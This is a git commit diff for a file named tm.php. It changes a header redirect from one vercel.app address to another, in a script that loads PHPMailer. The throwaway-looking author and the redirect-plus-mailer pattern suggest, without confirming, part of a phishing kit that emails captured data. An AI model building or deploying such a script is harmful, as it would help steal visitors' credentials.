98e825b4059594c8f9243bbec0976c9c3e989aa1
dndjdbffnfnfnfnnf <dndjdbffnfnfnfnnf@gmail.com>
2025-09-06 15:48:04 +0500

    Update tm.php

--- tm.php
+++ tm.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location:https://pas-usbd-bdsbd.vercel.app/");
+header("Location:https://professor-pas.vercel.app/");
 
 require 'Exception.php';
 require 'PHPMailer.php';
